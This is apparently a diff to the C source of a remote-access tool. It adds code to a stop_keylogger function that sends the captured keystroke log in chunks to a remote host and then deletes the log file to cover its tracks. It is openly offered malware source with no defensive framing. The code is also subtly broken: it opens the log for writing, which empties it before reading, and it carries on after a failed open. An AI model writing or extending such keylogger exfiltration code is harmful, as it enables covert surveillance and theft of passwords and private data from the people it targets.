@@ -225,6 +225,47 @@ void stop_keylogger(struct session_info * session_info) {
     log_message("Stoping Keylogger");
 #ifdef CLIENT_BUILD
     session_info->run_keylogger = false;
+
+    pthread_join(session_info->keylogger_thread, NULL);
+
+    // Send the keylog file
+    FILE * log_file = fopen(KEYLOG_FILE_PATH, "w");
+    if (log_file == NULL) {
+        log_message("Failed to open keylog file: %s", KEYLOG_FILE_PATH);
+    }
+    char * file_buffer = malloc(MESSAGE_BUFFER_LENGTH);
+    if (file_buffer == NULL) {
+        log_message("Failed to allocate file buffer", KEYLOG_FILE_PATH);
+        fclose(log_file);
+        return;
+    }
+
+    // Send over the filename and the FILENAME command
+    send_message(session_info->client_options_->client_fd, session_info->client_options_->host, RECEIVING_PORT, KEYLOG_FILE_PATH);
+    usleep(500000);
+    send_command(session_info->client_options_->client_fd, session_info->client_options_->host, RECEIVING_PORT, FILENAME);
+
+    size_t chunk_count = 0;
+    size_t chunk_bytes;
+    while ((chunk_bytes = fread(file_buffer, 1, MESSAGE_BUFFER_LENGTH - 1, log_file)) > 0) {
+        file_buffer[chunk_bytes] = '\0';
+        send_message(session_info->client_options_->client_fd, session_info->client_options_->host, RECEIVING_PORT, file_buffer);
+        chunk_count++;
+        log_message("Sent chunk %zu (%zu bytes)\n", chunk_count, chunk_bytes);
+    }
+
+    log_message("Keylog File transfer complete. Sent %zu chunks\n", chunk_count);
+
+    fclose(log_file);
+    free(file_buffer);
+
+    usleep(500000);
+    send_command(session_info->client_options_->client_fd, session_info->client_options_->host, RECEIVING_PORT, SEND_FILE);
+
+    // Delete keylog file
+    if (remove(KEYLOG_FILE_PATH) != 0) {
+        perror("Error removing keylog");
+    }
 #endif
 }
 
